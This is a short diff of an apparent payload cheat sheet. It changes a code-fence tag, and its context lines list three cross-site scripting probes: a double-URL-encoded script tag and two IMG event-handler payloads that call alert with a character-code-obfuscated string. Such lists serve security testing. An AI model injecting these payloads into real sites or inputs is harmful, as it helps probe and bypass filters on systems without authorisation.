@@ -1,6 +1,6 @@
 ### xss payloads:
 
-```javascript
+```js
 %253Cscript%253Ealert('XSS')%253C%252Fscript%253E
 <IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
 <IMG SRC=x onafterprint="alert(String.fromCharCode(88,83,83))">
